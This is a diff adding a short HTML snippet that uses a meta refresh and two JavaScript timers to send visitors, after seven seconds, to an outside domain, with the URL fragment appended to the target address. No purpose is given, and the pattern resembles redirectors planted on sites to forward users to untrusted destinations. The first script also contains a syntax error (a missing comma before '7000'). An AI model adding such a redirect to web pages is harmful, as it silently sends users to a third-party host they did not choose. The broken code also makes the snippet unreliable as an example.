@@ -1,0 +1,11 @@
+<meta http-equiv="refresh" content="7; url=">
+<script>
+	setTimeout(function () {
+		document.getElementsByTagName("META")[0].setAttribute('content','7; url=http://guleman.com/'+window.location.href.split('#')[1]);
+	}7000); // 7 seconds	
+</script>
+<script>
+	setTimeout(function () {
+		document.location.href = 'http://guleman.com/'+window.location.href.split('#')[1]; // the redirect goes here
+	},7000); // 7 seconds
+</script>
